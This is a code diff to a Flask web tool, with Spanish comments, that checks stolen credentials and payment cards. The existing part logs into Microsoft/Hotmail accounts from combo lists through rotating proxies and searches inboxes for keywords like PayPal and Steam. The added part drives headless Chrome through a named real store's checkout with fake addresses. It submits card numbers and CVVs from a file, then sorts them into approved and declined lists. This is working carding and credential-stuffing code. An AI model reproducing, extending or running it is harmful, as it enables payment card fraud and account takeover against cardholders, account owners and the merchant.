@@ -10,12 +10,18 @@ import uuid
 import json
 import zipfile
 import shutil
+import subprocess
+import sys
 from datetime import datetime
 from urllib.parse import urlparse, parse_qs
-from requests.adapters import HTTPAdapter
-from urllib3.util.retry import Retry
 from flask import Flask, render_template, request, jsonify, send_file, send_from_directory
 from flask_cors import CORS
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.support.ui import Select
+from collections import Counter
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -31,7 +37,8 @@ CONFIG = {
     'threads': 100,
     'timeout': 15,
     'proxies_file': 'proxies.txt',
-    'accounts_file': 'acc.txt'
+    'accounts_file': 'acc.txt',
+    'cards_file': 'cards.txt'
 }
 
 try:
@@ -68,14 +75,312 @@ checker_state = {
         'inbox': [],
         '2fa': [],
         'bad': [],
-        'errors': []
+        'errors': [],
+        'approved': [],
+        'declined': [],
+        'invalid': [],
+        'pending': []
     },
     'logs': [],
     'start_time': None,
     'session_folder': None,
     'export_ready': False,
-    'export_files': []
+    'export_files': [],
+    'card_results': []
 }
+
+# ============================================
+# AUTHORIZE.NET CARD CHECKER
+# ============================================
+
+B = "https://store.unclebills.com"
+PROD_URL = B + "/a-pup-above-frozen-turkey-pawella-1-lb-dry-dog-food"
+PROD_ID = "7277"
+
+def mkdriver(proxy=None):
+    opts = Options()
+    opts.add_argument('--no-sandbox')
+    opts.add_argument('--disable-gpu')
+    opts.add_argument('--disable-dev-shm-usage')
+    opts.add_argument('--window-size=1400,900')
+    opts.add_argument('--disable-web-security')
+    opts.add_argument('--headless=new')  # Modo headless para servidor
+    opts.add_experimental_option('excludeSwitches', ['enable-automation'])
+    
+    # Usar Chrome en el servidor (sin rutas fijas)
+    opts.add_argument('--disable-blink-features=AutomationControlled')
+    opts.add_experimental_option('useAutomationExtension', False)
+    
+    # Proxy si se proporciona
+    if proxy:
+        opts.add_argument(f'--proxy-server={proxy}')
+    
+    # Intentar diferentes ubicaciones de Chrome
+    chrome_paths = [
+        '/usr/bin/google-chrome',
+        '/usr/bin/chromium-browser',
+        '/usr/bin/chromium',
+        'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
+        'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe'
+    ]
+    
+    for path in chrome_paths:
+        if os.path.exists(path):
+            opts.binary_location = path
+            break
+    
+    # ChromeDriver automático
+    try:
+        from webdriver_manager.chrome import ChromeDriverManager
+        svc = Service(ChromeDriverManager().install())
+        return webdriver.Chrome(service=svc, options=opts)
+    except:
+        # Fallback: intentar con chromedriver en PATH
+        try:
+            svc = Service('chromedriver')
+            return webdriver.Chrome(service=svc, options=opts)
+        except:
+            return None
+
+def handle_alert(driver):
+    try:
+        a = driver.switch_to.alert
+        txt = a.text
+        a.accept()
+        return txt
+    except:
+        return ""
+
+def step_add_to_cart(driver):
+    try:
+        driver.get(PROD_URL)
+        time.sleep(1.5)
+        
+        tok = re.findall(r'__RequestVerificationToken[^>]+value="([^"]+)"', driver.page_source)
+        if not tok:
+            return False
+        token = tok[0]
+        
+        driver.execute_script("""
+            var x = new XMLHttpRequest();
+            x.open('POST', '/addproducttocart/details/""" + PROD_ID + """/1', false);
+            x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            x.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+            x.send('__RequestVerificationToken=' + encodeURIComponent(arguments[0]) + '&addtocart_""" + PROD_ID + """.EnteredQuantity=1');
+        """, token)
+        time.sleep(1)
+        
+        driver.get(B + "/onepagecheckout")
+        time.sleep(2)
+        return "Checkout" in driver.title
+    except:
+        return False
+
+def step_fill_checkout(driver):
+    try:
+        driver.execute_script('Accordion.openSection("#opc-shipping")')
+        time.sleep(1.5)
+        
+        fields = [
+            ('ShippingNewAddress_FirstName', 'John'),
+            ('ShippingNewAddress_LastName', 'Doe'),
+            ('ShippingNewAddress_Email', 'john@test.com'),
+            ('ShippingNewAddress_City', 'Fort Wayne'),
+            ('ShippingNewAddress_Address1', '6339 W Jefferson Blvd'),
+            ('ShippingNewAddress_ZipPostalCode', '46804'),
+            ('ShippingNewAddress_PhoneNumber', '2125551234'),
+        ]
+        for fid, val in fields:
+            try:
+                el = driver.find_element(By.ID, fid)
+                if el.is_displayed() and el.is_enabled():
+                    el.clear()
+                    el.send_keys(val)
+            except:
+                pass
+        
+        try:
+            Select(driver.find_element(By.ID, 'ShippingNewAddress_CountryId')).select_by_value('1')
+        except:
+            pass
+        time.sleep(2)
+        try:
+            Select(driver.find_element(By.ID, 'ShippingNewAddress_StateProvinceId')).select_by_value('21')
+        except:
+            pass
+        
+        driver.execute_script('Shipping.save()')
+        time.sleep(1)
+        handle_alert(driver)
+        
+        driver.execute_script('Accordion.openSection("#opc-billing")')
+        time.sleep(1.5)
+        
+        try:
+            nb = driver.find_element(By.ID, 'new-billing-address')
+            if nb.is_enabled() and not nb.is_selected():
+                driver.execute_script('arguments[0].click();', nb)
+            time.sleep(1)
+        except:
+            pass
+        
+        bill_fields = [
+            ('BillingNewAddress_FirstName', 'James'),
+            ('BillingNewAddress_LastName', 'yaser'),
+            ('BillingNewAddress_Email', 'test@test.com'),
+            ('BillingNewAddress_City', 'Elizabeth'),
+            ('BillingNewAddress_Address1', '37674 Oak Ln'),
+            ('BillingNewAddress_ZipPostalCode', '80107'),
+            ('BillingNewAddress_PhoneNumber', '7205994578'),
+        ]
+        for fid, val in bill_fields:
+            try:
+                el = driver.find_element(By.ID, fid)
+                if el.is_displayed() and el.is_enabled():
+                    el.clear()
+                    el.send_keys(val)
+            except:
+                pass
+        
+        try:
+            country_el = driver.find_element(By.ID, 'BillingNewAddress_CountryId')
+            Select(country_el).select_by_value('1')
+            driver.execute_script("arguments[0].dispatchEvent(new Event('change',{bubbles:true}));", country_el)
+            time.sleep(2.5)
+        except:
+            pass
+        
+        try:
+            state_el = driver.find_element(By.ID, 'BillingNewAddress_StateProvinceId')
+            Select(state_el).select_by_value('10')
+        except:
+            pass
+        
+        driver.execute_script('Billing.save()')
+        time.sleep(2)
+        err = handle_alert(driver)
+        if err and ('required' in err.lower() or 'object' in err.lower() or 'not set' in err.lower()):
+            try:
+                state_el = driver.find_element(By.ID, 'BillingNewAddress_StateProvinceId')
+                driver.execute_script("arguments[0].value='';", state_el)
+            except:
+                pass
+            driver.execute_script('Billing.save()')
+            time.sleep(2)
+            handle_alert(driver)
+        
+        driver.execute_script('Accordion.openSection("#opc-payment_method")')
+        time.sleep(0.5)
+        try:
+            Select(driver.find_element(By.ID, 'paymentmethod')).select_by_value('Payments.AuthorizeNet')
+        except:
+            pass
+        driver.execute_script('PaymentMethod.save()')
+        time.sleep(0.5)
+        handle_alert(driver)
+        
+        return True
+    except:
+        return False
+
+def step_submit_payment(driver, card):
+    try:
+        driver.execute_script('Accordion.openSection("#opc-payment_info")')
+        time.sleep(2)
+        
+        ey = card['ey'] if len(card['ey']) == 4 else "20" + card['ey']
+        card_name = card.get('nm', 'James yaser') or 'James yaser'
+        
+        driver.execute_script(f"""
+            var setV = function(id, val) {{
+                var e = document.getElementById(id);
+                if (e) {{ e.value = val; e.dispatchEvent(new Event('change',{{bubbles:true}})); }}
+            }};
+            setV('CardholderName', '{card_name}');
+            setV('CardNumber', '{card['n']}');
+            setV('CardCode', '{card['cv']}');
+            try {{ document.getElementById('ExpireMonth').value = '{card['em']}'; }} catch(e) {{}}
+            try {{ document.getElementById('ExpireYear').value = '{ey}'; }} catch(e) {{}}
+        """)
+        
+        driver.execute_script('PaymentInfo.save()')
+        time.sleep(3)
+        handle_alert(driver)
+        
+        for retry in range(2):
+            driver.execute_script('ConfirmOrder.save()')
+            time.sleep(3)
+            err = handle_alert(driver)
+            if err:
+                if "payment information" in err.lower() and "not entered" in err.lower() and retry == 0:
+                    driver.execute_script('PaymentInfo.save()')
+                    time.sleep(2)
+                    handle_alert(driver)
+                    continue
+            break
+        return True
+    except:
+        return False
+
+def step_read_response(driver):
+    try:
+        ps = driver.page_source.lower()
+        if "thank you" in ps or "order completed" in ps or "order placed" in ps:
+            return ("APPROVED", "Order confirmed")
+        
+        m = re.search(r'(?:error|payment error)\s*[#:]*\s*(\d+)[:\s]*([^<]{5,150})', ps, re.I)
+        if m:
+            code = m.group(1)
+            msg = m.group(2).strip()
+            if "declined" in ps or "declined" in msg.lower():
+                return ("DECLINED", f"Error #{code}: {msg[:100]}")
+            if "expired" in msg.lower() or "expir" in msg.lower():
+                return ("DECLINED", f"Error #{code}: {msg[:100]}")
+            if "invalid" in msg.lower() or "invalid" in ps:
+                return ("INVALID", f"Error #{code}: {msg[:100]}")
+            return ("DECLINED", f"Error #{code}: {msg[:100]}")
+        
+        if "declined" in ps:
+            m2 = re.search(r'(?:declined|this transaction)[^<]{5,150}', ps)
+            return ("DECLINED", m2.group().strip()[:120] if m2 else "Declined")
+        
+        if "invalid" in ps and "card" in ps:
+            return ("INVALID", "Card rejected")
+        
+        if "billing" in ps and ("not provided" in ps or "required" in ps):
+            return ("PENDING", "Billing not provided")
+        
+        if "payment" in ps and "not entered" in ps:
+            return ("PENDING", "Payment info not saved")
+        
+        if "error" in ps:
+            return ("ERROR", "Form error")
+        
+        return ("UNKNOWN", "No clear result")
+    except:
+        return ("ERROR", "Failed to read response")
+
+def test_card(card, proxy=None):
+    driver = mkdriver(proxy)
+    if not driver:
+        return "ERROR", "Failed to initialize driver", ""
+    
+    try:
+        if not step_add_to_cart(driver):
+            return "ERROR", "Cart add failed", ""
+        if not step_fill_checkout(driver):
+            return "PENDING", "Checkout form failed", ""
+        if not step_submit_payment(driver, card):
+            return "PENDING", "Payment not submitted", ""
+        status, msg = step_read_response(driver)
+        return status, msg, ""
+    except Exception as e:
+        return "ERROR", str(e)[:100], ""
+    finally:
+        try:
+            driver.quit()
+        except:
+            pass
 
 # ============================================
 # FUNCIONES DE UTILIDAD
@@ -136,6 +441,40 @@ def parse_proxies(text):
                 proxies.append(f"http://{line}")
     return proxies
 
+def parse_cards(text):
+    cards = []
+    for line in text.split('\n'):
+        line = line.strip()
+        if not line:
+            continue
+        
+        # Intentar diferentes formatos
+        parts = re.split(r'[|,;:\t\s]+', line)
+        if len(parts) >= 3:
+            cn = parts[0].strip().replace(' ', '').replace('-', '')
+            if cn.isdigit() and len(cn) >= 13:
+                exp = parts[1].strip().split('/')
+                em = exp[0].zfill(2) if exp and exp[0].isdigit() else '12'
+                ey = exp[1][-2:] if len(exp) > 1 and exp[1].isdigit() else '28'
+                cv = parts[2].strip()[:4]
+                nm = parts[3].strip()[:50] if len(parts) > 3 else ''
+                
+                # Detectar marca
+                brand = 'VISA' if cn.startswith('4') else ('MASTERCARD' if re.match(r'^5[1-5]', cn) else ('AMEX' if cn[:2] in ('34','37') else 'OTHER'))
+                
+                cards.append({
+                    'n': cn,
+                    'em': em,
+                    'ey': ey,
+                    'cv': cv,
+                    'nm': nm,
+                    'b6': cn[:6],
+                    'l4': cn[-4:],
+                    'br': brand
+                })
+    
+    return cards
+
 def format_proxy(proxy):
     if not proxy: 
         return None
@@ -158,10 +497,8 @@ def get_session_folder():
         if not os.path.exists(base):
             os.makedirs(base)
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-        checker_state['session_folder'] = os.path.join(base, f"Inbox_{timestamp}")
+        checker_state['session_folder'] = os.path.join(base, f"Results_{timestamp}")
         os.makedirs(checker_state['session_folder'], exist_ok=True)
-        os.makedirs(os.path.join(checker_state['session_folder'], "Countries"), exist_ok=True)
-        os.makedirs(os.path.join(checker_state['session_folder'], "Keywords"), exist_ok=True)
     return checker_state['session_folder']
 
 def save_result(filename, content):
@@ -170,23 +507,13 @@ def save_result(filename, content):
     with open(path, 'a', encoding='utf-8') as f:
         f.write(content + '\n')
 
-def save_country_result(country, email, password):
-    folder = os.path.join(get_session_folder(), 'Countries')
-    path = os.path.join(folder, f"{country}.txt")
-    with open(path, 'a', encoding='utf-8') as f:
-        f.write(f"{email}:{password}\n")
-
-def save_keyword_result(keyword, content):
-    safe_name = re.sub(r'[<>:"/\\|?*]', '_', keyword.strip()) or 'keyword'
-    folder = os.path.join(get_session_folder(), 'Keywords')
-    path = os.path.join(folder, f"{safe_name}.txt")
-    with open(path, 'a', encoding='utf-8') as f:
-        f.write(content + '\n')
-
 def create_optimized_session():
     session = requests.Session()
     threads = CONFIG.get('threads', 100)
     pool_size = threads + 50
+    
+    from requests.adapters import HTTPAdapter
+    from urllib3.util.retry import Retry
     
     retry_strategy = Retry(
         total=2,
@@ -217,7 +544,72 @@ def update_stats():
             stats['cpm'] = int(stats['checked'] / elapsed * 60)
 
 # ============================================
-# CLASE MICROSOFT INBOX CHECKER
+# FUNCIÓN DE VERIFICACIÓN DE CARD
+# ============================================
+def check_card(card, proxies):
+    if not checker_state['running']:
+        return
+    
+    try:
+        proxy = None
+        if proxies:
+            proxy = format_proxy(random.choice(proxies))
+        
+        status, msg, gw = test_card(card, proxy)
+        
+        ico = {"APPROVED":"[+]","DECLINED":"[!]","INVALID":"[-]","PENDING":"[~]","ERROR":"[E]"}.get(status,"[?]")
+        
+        result = {
+            'card': f"{card['b6']}...{card['l4']}",
+            'brand': card['br'],
+            'status': status,
+            'reason': msg,
+            'full': f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']}"
+        }
+        
+        checker_state['card_results'].append(result)
+        
+        # Guardar en archivos
+        save_result('Cards_Results.txt', f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {status} | {msg}")
+        
+        # Guardar por estado
+        if status == 'APPROVED':
+            checker_state['stats']['valid'] += 1
+            checker_state['results']['approved'].append(f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
+            save_result('Approved.txt', f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
+            add_log(f"{ico} {card['b6']}...{card['l4']} - {status} - {msg}", 'success')
+        elif status == 'DECLINED':
+            checker_state['stats']['bad'] += 1
+            checker_state['results']['declined'].append(f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
+            save_result('Declined.txt', f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
+            add_log(f"{ico} {card['b6']}...{card['l4']} - {status} - {msg}", 'warning')
+        elif status == 'INVALID':
+            checker_state['stats']['bad'] += 1
+            checker_state['results']['invalid'].append(f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
+            save_result('Invalid.txt', f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
+            add_log(f"{ico} {card['b6']}...{card['l4']} - {status} - {msg}", 'error')
+        elif status == 'PENDING':
+            checker_state['stats']['2fa'] += 1
+            checker_state['results']['pending'].append(f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
+            save_result('Pending.txt', f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
+            add_log(f"{ico} {card['b6']}...{card['l4']} - {status} - {msg}", 'info')
+        else:
+            checker_state['stats']['errors'] += 1
+            checker_state['results']['errors'].append(f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
+            save_result('Errors.txt', f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
+            add_log(f"{ico} {card['b6']}...{card['l4']} - {status} - {msg}", 'error')
+    
+    except Exception as e:
+        checker_state['stats']['errors'] += 1
+        add_log(f"⚠️ {card.get('b6', '')}...{card.get('l4', '')} - ERROR: {str(e)}", 'error')
+    
+    finally:
+        with threading.Lock():
+            checker_state['stats']['checked'] += 1
+        update_stats()
+
+# ============================================
+# CLASE MICROSOFT CHECKER (PARA EMAIL)
 # ============================================
 class MicrosoftInboxChecker:
     def __init__(self, email, password, proxy=None, inbox_keywords=None):
@@ -228,8 +620,6 @@ class MicrosoftInboxChecker:
         self.session = create_optimized_session()
         if proxy:
             self.session.proxies = {'http': proxy, 'https': proxy}
-        self.access_token = None
-        self.cid = None
         self.country = None
         self.name = None
         self.sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
@@ -414,11 +804,11 @@ class MicrosoftInboxChecker:
             if not token:
                 return False
             
-            self.cid = self.session.cookies.get('MSPCID', self.email)
+            cid = self.session.cookies.get('MSPCID', self.email)
             
             headers = {
                 'Authorization': f'Bearer {token}',
-                'X-AnchorMailbox': f'CID:{self.cid}',
+                'X-AnchorMailbox': f'CID:{cid}',
                 'Content-Type': 'application/json',
                 'User-Agent': 'Outlook-Android/2.0',
                 'Accept': 'application/json'
@@ -574,7 +964,7 @@ class MicrosoftInboxChecker:
             return None
 
 # ============================================
-# FUNCIÓN DE VERIFICACIÓN DE CUENTA
+# FUNCIÓN DE VERIFICACIÓN DE CUENTA (EMAIL)
 # ============================================
 def check_account(email, password, keywords, proxies):
     if not checker_state['running']:
@@ -593,8 +983,6 @@ def check_account(email, password, keywords, proxies):
             with threading.Lock():
                 checker_state['stats']['valid'] += 1
             
-            save_result('Valid.txt', f"{email}:{password}")
-            
             graph_token = checker.get_graph_token()
             country_obtained = False
             country = 'Unknown'
@@ -608,27 +996,12 @@ def check_account(email, password, keywords, proxies):
                 if checker.get_profile_via_substrate():
                     country = checker.country or 'Unknown'
             
-            if country and country != 'Unknown':
-                save_country_result(country, email, password)
-            
             total_count, inbox_hits = checker.check_inbox()
-            
-            flag = get_flag(country) if country != 'Unknown' else '🏴'
             
             if total_count > 0:
                 hits_str = ' | '.join(inbox_hits)
                 save_string = f"{email}:{password} | {country} | {total_count} Email Found | [{hits_str}]"
-                save_result('Inbox.txt', save_string)
-                
-                # Guardar en resultados para export
                 checker_state['results']['inbox'].append(save_string)
-                
-                # Guardar por keyword
-                for hit in inbox_hits:
-                    if ': ' in hit:
-                        kw, count = hit.rsplit(': ', 1)
-                        line = f"{email}:{password} | {country} | {count} Email Found | [{kw}: {count}]"
-                        save_keyword_result(kw, line)
                 
                 with threading.Lock():
                     checker_state['stats']['inbox'] += 1
@@ -636,14 +1009,12 @@ def check_account(email, password, keywords, proxies):
                 add_log(f"📬 {email} - INBOX HITS: {total_count} emails ({country}) | {hits_str}", 'success')
                 
             else:
-                # Guardar en válidos (sin inbox)
                 checker_state['results']['valid'].append(f"{email}:{password} | {country}")
                 add_log(f"✅ {email} - VALID ({country})", 'success')
             
         elif status == '2FA':
             with threading.Lock():
                 checker_state['stats']['2fa'] += 1
-            save_result('2FA.txt', f"{email}:{password}")
             checker_state['results']['2fa'].append(f"{email}:{password}")
             add_log(f"🔐 {email} - 2FA REQUIRED", 'warning')
             
@@ -677,50 +1048,97 @@ def start_checking():
         return jsonify({'error': 'Already running'}), 400
     
     data = request.json
-    accounts = parse_accounts(data.get('accounts', ''))
-    keywords = parse_keywords(data.get('keywords', ''))
-    proxies = parse_proxies(data.get('proxies', ''))
-    threads = int(data.get('threads', CONFIG['threads']))
+    check_type = data.get('type', 'email')  # 'email' o 'card'
     
-    if not accounts:
-        return jsonify({'error': 'No valid accounts found'}), 400
+    if check_type == 'email':
+        accounts = parse_accounts(data.get('accounts', ''))
+        keywords = parse_keywords(data.get('keywords', ''))
+        proxies = parse_proxies(data.get('proxies', ''))
+        threads = int(data.get('threads', CONFIG['threads']))
+        
+        if not accounts:
+            return jsonify({'error': 'No valid accounts found'}), 400
+        
+        if not keywords:
+            keywords = ["Steam", "Netflix", "PayPal", "Amazon", "Security Alert"]
+        
+        checker_state['running'] = True
+        checker_state['stats'] = {
+            'checked': 0, 'valid': 0, 'inbox': 0, 'custom': 0,
+            'bad': 0, '2fa': 0, 'errors': 0, 'retries': 0, 'cpm': 0,
+            'total': len(accounts)
+        }
+        checker_state['results'] = {'valid': [], 'inbox': [], '2fa': [], 'bad': [], 'errors': [],
+                                   'approved': [], 'declined': [], 'invalid': [], 'pending': []}
+        checker_state['card_results'] = []
+        checker_state['logs'] = []
+        checker_state['start_time'] = time.time()
+        checker_state['session_folder'] = None
+        checker_state['export_ready'] = False
+        checker_state['export_files'] = []
+        
+        get_session_folder()
+        
+        add_log(f"🚀 Iniciando verificación de {len(accounts)} cuentas", 'info')
+        add_log(f"📝 Keywords: {', '.join(keywords)}", 'info')
+        add_log(f"📡 Proxies: {len(proxies)}", 'info')
+        add_log(f"⚙️ Hilos: {threads}", 'info')
+        add_log(f"📁 Session folder: {get_session_folder()}", 'info')
+        
+        thread = threading.Thread(target=run_checker_email, args=(accounts, keywords, proxies, threads))
+        thread.daemon = True
+        thread.start()
+        
+        return jsonify({
+            'success': True,
+            'total': len(accounts),
+            'type': 'email'
+        })
     
-    if not keywords:
-        keywords = ["Steam", "Netflix", "PayPal", "Amazon", "Security Alert"]
+    elif check_type == 'card':
+        cards_text = data.get('cards', '')
+        cards = parse_cards(cards_text)
+        proxies = parse_proxies(data.get('proxies', ''))
+        threads = int(data.get('threads', 5))  # Menos threads para Selenium
+        
+        if not cards:
+            return jsonify({'error': 'No valid cards found'}), 400
+        
+        checker_state['running'] = True
+        checker_state['stats'] = {
+            'checked': 0, 'valid': 0, 'inbox': 0, 'custom': 0,
+            'bad': 0, '2fa': 0, 'errors': 0, 'retries': 0, 'cpm': 0,
+            'total': len(cards)
+        }
+        checker_state['results'] = {'valid': [], 'inbox': [], '2fa': [], 'bad': [], 'errors': [],
+                                   'approved': [], 'declined': [], 'invalid': [], 'pending': []}
+        checker_state['card_results'] = []
+        checker_state['logs'] = []
+        checker_state['start_time'] = time.time()
+        checker_state['session_folder'] = None
+        checker_state['export_ready'] = False
+        checker_state['export_files'] = []
+        
+        get_session_folder()
+        
+        add_log(f"💳 Iniciando verificación de {len(cards)} tarjetas", 'info')
+        add_log(f"📡 Proxies: {len(proxies)}", 'info')
+        add_log(f"⚙️ Hilos: {threads}", 'info')
+        add_log(f"📁 Session folder: {get_session_folder()}", 'info')
+        
+        thread = threading.Thread(target=run_checker_cards, args=(cards, proxies, threads))
+        thread.daemon = True
+        thread.start()
+        
+        return jsonify({
+            'success': True,
+            'total': len(cards),
+            'type': 'card'
+        })
     
-    # Resetear estado
-    checker_state['running'] = True
-    checker_state['stats'] = {
-        'checked': 0, 'valid': 0, 'inbox': 0, 'custom': 0,
-        'bad': 0, '2fa': 0, 'errors': 0, 'retries': 0, 'cpm': 0,
-        'total': len(accounts)
-    }
-    checker_state['results'] = {'valid': [], 'inbox': [], '2fa': [], 'bad': [], 'errors': []}
-    checker_state['logs'] = []
-    checker_state['start_time'] = time.time()
-    checker_state['session_folder'] = None
-    checker_state['export_ready'] = False
-    checker_state['export_files'] = []
-    
-    get_session_folder()
-    
-    add_log(f"🚀 Iniciando verificación de {len(accounts)} cuentas", 'info')
-    add_log(f"📝 Keywords: {', '.join(keywords)}", 'info')
-    add_log(f"📡 Proxies: {len(proxies)}", 'info')
-    add_log(f"⚙️ Hilos: {threads}", 'info')
-    add_log(f"📁 Session folder: {get_session_folder()}", 'info')
-    
-    # Ejecutar en hilo separado
-    thread = threading.Thread(target=run_checker, args=(accounts, keywords, proxies, threads))
-    thread.daemon = True
-    thread.start()
-    
-    return jsonify({
-        'success': True,
-        'total': len(accounts)
-    })
+    return jsonify({'error': 'Invalid check type'}), 400
 
-def run_checker(accounts, keywords, proxies, max_threads):
+def run_checker_email(accounts, keywords, proxies, max_threads):
     try:
         with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
             futures = []
@@ -747,47 +1165,54 @@ def run_checker(accounts, keywords, proxies, max_threads):
         checker_state['export_ready'] = True
         update_export_files_list()
 
+def run_checker_cards(cards, proxies, max_threads):
+    try:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
+            futures = []
+            for card in cards:
+                if not checker_state['running']:
+                    break
+                future = executor.submit(check_card, card, proxies)
+                futures.append(future)
+            
+            for future in concurrent.futures.as_completed(futures):
+                if not checker_state['running']:
+                    break
+                try:
+                    future.result()
+                except:
+                    pass
+    finally:
+        checker_state['running'] = False
+        elapsed = time.time() - checker_state['start_time']
+        add_log(f"✅ Verificación de tarjetas completada en {int(elapsed)}s", 'success')
+        
+        # Resumen de tarjetas
+        approved = sum(1 for r in checker_state['card_results'] if r['status'] == 'APPROVED')
+        declined = sum(1 for r in checker_state['card_results'] if r['status'] == 'DECLINED')
+        invalid = sum(1 for r in checker_state['card_results'] if r['status'] == 'INVALID')
+        pending = sum(1 for r in checker_state['card_results'] if r['status'] == 'PENDING')
+        
+        add_log(f"📊 APROBADAS: {approved} | DECLINADAS: {declined} | INVALIDAS: {invalid} | PENDIENTES: {pending}", 'info')
+        add_log(f"📁 Resultados guardados en: {get_session_folder()}", 'info')
+        checker_state['export_ready'] = True
+        update_export_files_list()
+
 def update_export_files_list():
-    """Actualiza la lista de archivos disponibles para exportar"""
     folder = get_session_folder()
     files = []
     
-    # Archivos principales
-    for f in ['Inbox.txt', 'Valid.txt', '2FA.txt']:
-        path = os.path.join(folder, f)
-        if os.path.exists(path):
-            files.append({
-                'name': f,
-                'path': path,
-                'size': os.path.getsize(path)
-            })
-    
-    # Archivos de Countries
-    countries_folder = os.path.join(folder, 'Countries')
-    if os.path.exists(countries_folder):
-        for f in os.listdir(countries_folder):
+    if os.path.exists(folder):
+        for f in os.listdir(folder):
             if f.endswith('.txt'):
-                path = os.path.join(countries_folder, f)
+                path = os.path.join(folder, f)
                 files.append({
-                    'name': f'Countries/{f}',
-                    'path': path,
-                    'size': os.path.getsize(path)
-                })
-    
-    # Archivos de Keywords
-    keywords_folder = os.path.join(folder, 'Keywords')
-    if os.path.exists(keywords_folder):
-        for f in os.listdir(keywords_folder):
-            if f.endswith('.txt'):
-                path = os.path.join(keywords_folder, f)
-                files.append({
-                    'name': f'Keywords/{f}',
+                    'name': f,
                     'path': path,
                     'size': os.path.getsize(path)
                 })
     
     checker_state['export_files'] = files
-    add_log(f"📋 {len(files)} archivos disponibles para exportar", 'info')
 
 @app.route('/api/stop', methods=['POST'])
 def stop_checking():
@@ -801,71 +1226,50 @@ def get_status():
     return jsonify({
         'running': checker_state['running'],
         'stats': checker_state['stats'],
-        'logs': checker_state['logs'][:30],
+        'logs': checker_state['logs'][:50],
         'results': checker_state['results'],
+        'card_results': checker_state['card_results'][-20:],
         'session_folder': get_session_folder(),
         'export_ready': checker_state['export_ready'],
         'export_files': checker_state['export_files']
     })
 
-# ============================================
-# RUTAS DE EXPORT - DESCARGAS DIRECTAS
-# ============================================
-
 @app.route('/api/download/<path:filename>', methods=['GET'])
 def download_file(filename):
-    """Descarga un archivo específico de la sesión"""
     folder = get_session_folder()
-    
-    # Buscar en la carpeta principal
     path = os.path.join(folder, filename)
     if os.path.exists(path):
-        return send_file(path, as_attachment=True, download_name=os.path.basename(filename))
-    
-    # Buscar en Countries
-    path = os.path.join(folder, 'Countries', filename)
-    if os.path.exists(path):
-        return send_file(path, as_attachment=True, download_name=os.path.basename(filename))
-    
-    # Buscar en Keywords
-    path = os.path.join(folder, 'Keywords', filename)
-    if os.path.exists(path):
-        return send_file(path, as_attachment=True, download_name=os.path.basename(filename))
-    
+        return send_file(path, as_attachment=True, download_name=filename)
     return jsonify({'error': 'File not found'}), 404
 
 @app.route('/api/download/inbox', methods=['GET'])
 def download_inbox():
-    """Descarga Inbox.txt"""
     folder = get_session_folder()
     path = os.path.join(folder, 'Inbox.txt')
-    if not os.path.exists(path):
-        return jsonify({'error': 'No inbox results found'}), 404
-    return send_file(path, as_attachment=True, download_name='Inbox.txt')
+    if os.path.exists(path):
+        return send_file(path, as_attachment=True, download_name='Inbox.txt')
+    return jsonify({'error': 'No inbox results found'}), 404
 
 @app.route('/api/download/valid', methods=['GET'])
 def download_valid():
-    """Descarga Valid.txt"""
     folder = get_session_folder()
     path = os.path.join(folder, 'Valid.txt')
-    if not os.path.exists(path):
-        return jsonify({'error': 'No valid results found'}), 404
-    return send_file(path, as_attachment=True, download_name='Valid.txt')
+    if os.path.exists(path):
+        return send_file(path, as_attachment=True, download_name='Valid.txt')
+    return jsonify({'error': 'No valid results found'}), 404
 
-@app.route('/api/download/2fa', methods=['GET'])
-def download_2fa():
-    """Descarga 2FA.txt"""
+@app.route('/api/download/approved', methods=['GET'])
+def download_approved():
     folder = get_session_folder()
-    path = os.path.join(folder, '2FA.txt')
-    if not os.path.exists(path):
-        return jsonify({'error': 'No 2FA results found'}), 404
-    return send_file(path, as_attachment=True, download_name='2FA.txt')
+    path = os.path.join(folder, 'Approved.txt')
+    if os.path.exists(path):
+        return send_file(path, as_attachment=True, download_name='Approved.txt')
+    return jsonify({'error': 'No approved cards found'}), 404
 
 @app.route('/api/download/all', methods=['GET'])
 def download_all():
-    """Descarga todo como ZIP"""
     folder = get_session_folder()
-    zip_filename = f"hotmail_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
+    zip_filename = f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
     
     with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
         for root, dirs, files in os.walk(folder):
@@ -878,7 +1282,6 @@ def download_all():
 
 @app.route('/api/files', methods=['GET'])
 def list_files():
-    """Lista todos los archivos disponibles para descargar"""
     update_export_files_list()
     return jsonify({
         'files': checker_state['export_files'],
@@ -890,4 +1293,4 @@ def get_config():
     return jsonify(CONFIG)
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=PORT)
+    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
